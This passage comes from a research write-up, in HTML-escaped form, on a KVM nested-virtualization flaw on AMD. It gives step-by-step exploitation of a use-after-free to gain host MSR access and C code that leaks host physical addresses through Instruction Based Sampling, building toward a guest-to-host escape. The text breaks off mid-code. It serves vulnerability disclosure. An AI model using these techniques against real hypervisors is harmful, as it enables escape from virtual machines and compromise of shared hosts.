class="c3"&gt;&amp;nbsp;vmcb &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;vmcb &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vmcb&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; copy_vmcb_control_area&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;But as mentioned before, &lt;/span&gt;&lt;span class="c15"&gt;svm-&amp;gt;nested.hsave-&amp;gt;control.msrpm_base_pa&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;can still point to&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c15"&gt;svm-&amp;gt;nested-&amp;gt;msrpm&lt;/span&gt;&lt;span&gt;. Once &lt;/span&gt;&lt;span class="c15"&gt;svm_free_nested&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;is finished and KVM passes control back to the guest, the CPU will use the freed pages for its MSR permission checks. This gives a guest unrestricted access to host MSRs if the pages are reused and partially overwritten with zeros.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;To summarize, a malicious guest can gain access to host MSRs using the following approach:&lt;/span&gt;&lt;/p&gt;&lt;ol class="c12 lst-kix_44h6gatzfsnw-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Enable the SVME bit in MSR_EFER to enable nested virtualization&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Repeatedly try to launch a L2 guest using the VMRUN instruction while flipping the INTERCEPT_VMRUN bit on a second CPU core. &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;If VMRUN succeeds, try to launch a &amp;ldquo;L3&amp;rdquo; guest using another invocation of VMRUN. If this fails, we have lost the race in step 2 and must try again. If VMRUN succeeds we have successfully overwritten &lt;/span&gt;&lt;span class="c15"&gt;svm-&amp;gt;nested.hsave&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;with our L2 context. &amp;nbsp;&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Clear the SVME bit in MSR_EFER while still running in the &amp;ldquo;L3&amp;rdquo; context. This frees the MSR permission bitmap backing pages used by the L2 guest who is now executing again. &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Wait until the KVM host reuses the backing pages. This will potentially clear all or some of the bits, giving the guest access to host MSRs.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;When I initially discovered and reported this vulnerability, I was feeling pretty confident that this type of MSR access should be more or less equivalent to full code execution on the host. While my feeling turned out to be correct, getting there still took me multiple weeks of exploit development. In the next section I&amp;rsquo;ll describe the steps to turn this primitive into a guest-to-host escape.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c13 c20" id="h.j9bji8tg793n"&gt;&lt;span&gt;The Exploit&lt;/span&gt;&lt;/h2&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;Assuming our guest can get full unrestricted access to any MSR (which is only a question of timing thanks to init_on_alloc=1 being the default for most modern distributions), how can we escalate this into running arbitrary code in the context of the KVM host? To answer this question we first need to look at what kind of MSRs are supported on a modern AMD system. Looking at the &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://www.amd.com/system/files/TechDocs/52740_16h_Models_30h-3Fh_BKDG.pdf"&gt;BIOS and Kernel Developer&amp;rsquo;s Guide&lt;/a&gt;&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;for recent AMD processors we can find a wide range of MSRs starting with well known and widely used ones such as EFER (the Extended Feature Enable Register) or LSTAR (the syscall target address) to rarely used ones like SMI_ON_IO_TRAP (can be used to generate a System Management Mode Interrupt when specific IO port ranges are accessed). &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;Looking at the list, several registers like LSTAR or KERNEL_GSBASE seem like interesting targets for redirecting the execution of the host kernel. Unrestricted access to these registers is actually &lt;/span&gt;&lt;span&gt;enabled by default&lt;/span&gt;&lt;span class="c8"&gt;, however they are automatically restored to a valid state by KVM after a vmexit so modifying them does not lead to any changes in host behavior. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;Still, there is one MSR that we previously mentioned and that seems to give us a straightforward way to achieve code execution: The VM_HSAVE_PA that stores the physical address of the host save area, which is used to restore the host context when a vmexit occurs. If we can point this MSR at a memory location under our control we should be able to fake a malicious host context and execute our own code after a vmexit.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;While this sounds pretty straightforward in theory, implementing it still has some challenges:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c12 lst-kix_qmksthfuerg1-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;AMD is pretty clear about the fact that software should not touch the host save area in any way and that the data stored in this area is CPU-dependent: &amp;ldquo;&lt;/span&gt;&lt;span class="c26"&gt;Processor implementations may store only part or none of host state in the memory area pointed to by VM_HSAVE_PA MSR and may store some or all host state in hidden on-chip memory. Different implementations may choose to save the hidden parts of the host&amp;rsquo;s segment registers as well as the selectors. For these reasons, software must not rely on the format or contents of the host state save area, nor attempt to change host state by modifying the contents of the host save area.&lt;/span&gt;&lt;span class="c8"&gt;&amp;rdquo; (AMD64 Architecture Programmer&amp;rsquo;s Manual, Volume 2: System Programming, Page 477). To strengthen the point, the format of the host save area is undocumented. &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Debugging issues involving an invalid host state is very tedious as any issue leads to an immediate processor shutdown. Even worse, I wasn&amp;rsquo;t sure if rewriting the VM_HSAVE_PA MSR while running inside a VM can even work. It&amp;rsquo;s not really something that should happen during normal operation so in the worst case scenario, overwriting the MSR would just lead to an immediate crash.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Even if we can create a valid (but malicious) host save area in our guest, we still need some way to identify its host physical address (HPA). Because our guest runs with nested paging enabled, physical addresses that we can see in the guest (GPAs) are still one address translation away from their HPA equivalent.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;After spending some time scrolling through AMD&amp;rsquo;s documentation, I still decided that VM_HSAVE_PA seems to be the best way forward and decided to tackle these problems one by one. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;After dumping the host save area of a normal KVM guest running on an AMD EPYC 7351P CPU, the first problem goes away quickly: As it turns out, the host save area has the same layout as a normal VMCB with only a couple of relevant fields initialized. Even better, the initialized fields include all the saved host information documented in the AMD manual so the fear that all interesting host state is stored in on-chip memory seems to be unfounded. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.62ceb349a4c2f9332b305830fc836b9fe5914c31"&gt;&lt;/a&gt;&lt;a id="t.7"&gt;&lt;/a&gt;&lt;table class="c30"&gt;&lt;tbody&gt;&lt;tr class="c28"&gt;&lt;td class="c32" colspan="1" rowspan="1"&gt; &lt;p class="c24"&gt;&lt;span class="c18"&gt;Saving Host State.&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;To ensure that the host can resume operation after #VMEXIT, VMRUN saves at least the following host state information:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c12 lst-kix_fc4hxeeodeag-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c14 li-bullet-0"&gt;&lt;span class="c8"&gt;CS.SEL, NEXT_RIP&amp;mdash;The CS selector and rIP of the instruction following the VMRUN. On #VMEXIT the host resumes running at this address.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c14 li-bullet-0"&gt;&lt;span class="c8"&gt;RFLAGS, RAX&amp;mdash;Host processor mode and the register used by VMRUN to address the VMCB.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c14 li-bullet-0"&gt;&lt;span class="c8"&gt;SS.SEL, RSP&amp;mdash;Stack pointer for host&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c14 li-bullet-0"&gt;&lt;span class="c8"&gt;CRO, CR3, CR4, EFER&amp;mdash;Paging/operating mode for host&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c14 li-bullet-0"&gt;&lt;span class="c8"&gt;IDTR, GDTR&amp;mdash;The pseudo-descriptors. VMRUN does not save or restore the host LDTR.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c14 li-bullet-0"&gt;&lt;span class="c8"&gt;ES.SEL and DS.SEL. &lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;Under the mistaken assumption that I solved the problem of creating a fake but valid host save area, I decided to look into building an infoleak that gives me the ability to translate GPAs to HPAs. A couple hours of manual reading led me to an AMD-specific performance monitoring feature called Instruction Based Sampling (&lt;/span&gt;&lt;span&gt;IBS&lt;/span&gt;&lt;span&gt;). When IBS is enabled by writing the right magic invocation to a set of MSRs, it samples every Nth instruction that is executed and collects a wide range of information about the instruction. This information is logged in another set of MSRs and can be used to analyze the performance of any piece of code running on the CPU. While most of the documentation for IBS is pretty sparse or hard to follow, the very useful open source project &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://github.com/jlgreathouse/AMD_IBS_Toolkit"&gt;AMD IBS Toolkit&lt;/a&gt;&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;contains working code, a readable high level description of IBS and a lot of useful references. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;IBS supports two different modes of operation, one that samples Instruction fetches and one that samples micro-ops (which you can think of as the internal RISC representation of more complex x64 instructions). Depending on the operation mode, different data is collected. Besides a lot of caching and latency information that we don&amp;rsquo;t care about, fetch sampling also returns the virtual address and physical address of the fetched instruction. Op sampling is even more useful as it returns the virtual address of the underlying instruction as well as virtual and physical addresses accessed by any load or store micro op. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;Interestingly, &lt;/span&gt;&lt;span&gt;IBS does not seem to care about the virtualization context of its user and every physical address returned by it is an HPA&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;(of course this is not a problem outside of this exploit as guest accesses to the IBS MSR&amp;rsquo;s will normally be restricted). The wide range of data returned by IBS and the fact that it&amp;rsquo;s completely driven by MSR reads and writes make it the perfect tool for building infoleaks for our exploit. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;Building a GPA -&amp;gt; HPA leak boils down to enabling IBS ops sampling, executing a lot of instructions that access a specific memory page in our VM and reading the IBS_DC_PHYS_AD MSR to find out its HPA:&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e9f6e96b7d3821fb7bfbf61c54c1f2f034c111dd"&gt;&lt;/a&gt;&lt;a id="t.8"&gt;&lt;/a&gt;&lt;table class="c30"&gt;&lt;tbody&gt;&lt;tr class="c28"&gt;&lt;td class="c17" colspan="1" rowspan="1"&gt; &lt;p class="c5"&gt;&lt;span class="c22"&gt;// This function leaks the HPA of a guest page using&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c22"&gt;// AMD&amp;#39;s Instruction Based Sampling. We try to sample&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c22"&gt;// one of our memory loads/writes to *p, which will&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c22"&gt;// store the physical memory address in MSR_IBC_DH_PHYS_AD&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;static&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;u64 leak_guest_hpa&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;u8 &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;p&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;volatile&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;u8 &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;ptr &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;p&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; u64 ibs &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;scatter_bits&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c10"&gt;0x2&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;IBS_OP_CUR_CNT_23&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;|&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; scatter_bits&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c10"&gt;0x10&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;IBS_OP_MAX_CNT&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;|&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;IBS_OP_EN&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;while&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;true&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; wrmsr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;MSR_IBS_OP_CTL&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ibs&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; u64 x &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;for&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;int&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0x1000&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="c1"&gt;++)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; x &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ptr&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c3"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ptr&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c3"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;+=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ptr&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c3"&gt;i &lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ptr&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c3"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;x&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;i &lt;/span&gt;&lt;span class="c1"&gt;%&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;50&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; u64 valid &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;rdmsr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;MSR_IBS_OP_CTL&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;IBS_OP_VAL&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;valid&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; u64 op3 &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;rdmsr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;MSR_IBS_OP_DATA3&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c3"&gt;op3 &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;IBS_ST_OP&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;||&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;op3 &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;IBS_LD_OP&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;op3 &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;IBS_DC_PHY_ADDR_VALID&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c23 c34"&gt;&amp;quot;[x] leak_guest_hpa: %lx %lx %lx\n&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;rdmsr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;MSR_IBS_OP_RIP&lt;/span&gt;&lt;span class="c1"&gt;),&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;rdmsr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;MSR_IBS_DC_PHYS_AD&lt;/span&gt;&lt;span class="c1"&gt;),&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;rdmsr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;MSR_IBS_DC_LIN_AD&lt;/span&gt;&lt;span class="c1"&gt;));&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;rdmsr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;MSR_IBS_DC_PHYS_AD&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span 